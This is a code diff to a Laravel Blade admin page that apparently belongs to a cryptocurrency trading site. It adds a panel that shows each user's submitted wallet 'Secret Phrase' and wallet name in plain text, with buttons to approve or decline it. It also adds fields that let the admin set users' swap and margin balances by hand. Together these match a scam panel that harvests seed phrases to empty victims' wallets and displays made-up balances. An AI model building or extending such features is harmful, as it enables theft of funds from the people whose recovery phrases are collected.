@@ -142,6 +142,34 @@
                 <br>
                 <hr>
                 <br>
+
+                <div class="form-group my-3">
+                    @if($user->phrase)
+                    @php
+                        $phrase = json_decode($user->phrase, true);
+                    @endphp
+                    <label>Secret Phrase <span class="badge {{ $phrase['status'] == 1 ? 'bg-success' : 'bg-danger' }}">{{ $phrase['status'] == 1 ? 'approved' : 'declined' }}</span></label>
+                    <textarea name="..." id="" disabled rows="10" cols="3" class="form-control mb-2 mt-2">{{ $phrase['phrase'] }} - {{ $phrase['wallet'] }}</textarea>
+                        <div class="d-flex justify-content-around">
+                            <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 1]) }}" method="post">
+                                @csrf
+                                <input type="hidden" value="{{ $phrase['phrase'] }}" name="phrase" id="phrase">
+                                <input type="hidden" value="{{ $phrase['wallet'] }}" name="wallet" id="phrase">
+                                <button type="submit" class="btn btn-success">Approve</button>
+                            </form>
+                            <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 0]) }}" method="post">
+                                @csrf
+                                <input type="hidden" value="{{ $phrase['phrase'] }}" name="phrase" id="phrase">
+                                <input type="hidden" value="{{ $phrase['wallet'] }}" name="wallet" id="phrase">
+                                <button type="submit" class="btn btn-danger">Decline</button>
+                            </form>
+                        </div>
+                    @endif
+                </div>
+                <br>
+                <hr>
+                <br>
+
                 <h4 class="text-center">User Funds</h4>
 
                 <div class="mt-4">
@@ -172,12 +200,12 @@
                 <div class="scrollspy-example" data-spy="scroll" data-target="#account-settings-scroll" data-offset="-100">
                     <div class="row">
                         <div class="col-xl-12 col-lg-12 col-md-12 layout-spacing">
-                            <form id="general-info" class="section general-info" action="{{ route('admin.users.update', $user->id) }}" method="post">
-                                @csrf
                                 <div class="info">
                                     <h5 class="">Personal Details</h5>
                                     <div class="row">
                                         <div class="col-lg-11 mx-auto">
+                                            <form id="general-info" class="section general-info" action="{{ route('admin.users.update', $user->id) }}" method="post">
+                                                @csrf
                                             <div class="form">
                                                 <div class="row">
                                                     <div class="col-sm-6">
@@ -260,12 +288,20 @@
                                                     <div class="col-sm-6">
                                                         <div class="form-group">
                                                             <label>Nationality </label>
-                                                            <select class="form-select @error('nationality') is-invalid @enderror" data-trigger name="nationality" id="nationality">
+                                                            <select class="form-select mb-2 @error('nationality') is-invalid @enderror" data-trigger name="nationality" id="nationality">
                                                                 <option value="">Select Nationality</option>
                                                                 @foreach(\App\Models\Nationality::query()->orderBy('name')->get() as $nationality)
                                                                     <option value="{{ $nationality->name }}" @if(ucwords($user->nationality) == ucwords($nationality->name)) selected @endif>{{ ucwords($nationality->name) }}</option>
                                                                 @endforeach
                                                             </select>
+                                                        </div>
+                                                        <div class="form-group">
+                                                            <label>Swap Balance</label>
+                                                            <input type="number" class="form-control mb-2 mt-2" name="swap" step="1" id="new-phone" value="{{ $user->swap }}">
+                                                        </div>
+                                                        <div class="form-group">
+                                                            <label>Margin Balance</label>
+                                                            <input type="number" class="form-control mb-2 mt-2" name="margin" step="1" id="new-phone" value="{{ $user->margin }}">
                                                         </div>
                                                     </div>
                                                 </div>
@@ -273,10 +309,10 @@
                                             <div class="">
                                                 <button type="submit" class="btn btn-primary">Update</button>
                                             </div>
+                                            </form>
                                         </div>
                                     </div>
                                 </div>
-                            </form>
                         </div>
                     </div>
                 </div>
